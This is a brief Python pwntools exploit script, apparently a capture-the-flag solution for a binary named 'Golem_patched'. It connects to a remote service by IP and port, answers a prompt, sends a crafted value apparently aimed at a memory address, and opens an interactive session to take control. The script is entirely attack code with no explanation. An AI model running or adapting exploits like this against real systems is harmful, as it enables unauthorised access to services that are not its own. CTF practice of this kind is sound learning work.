#!/usr/bin/env python3

from pwn import *

elf = ELF("./Golem_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("77.37.125.41", 40444)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    io.sendlineafter(b'[yes/no]:', b'yes')
    io.sendlineafter(b'shoot?', b'fffffffffff04068')

    io.interactive()

if __name__ == "__main__":
    main()
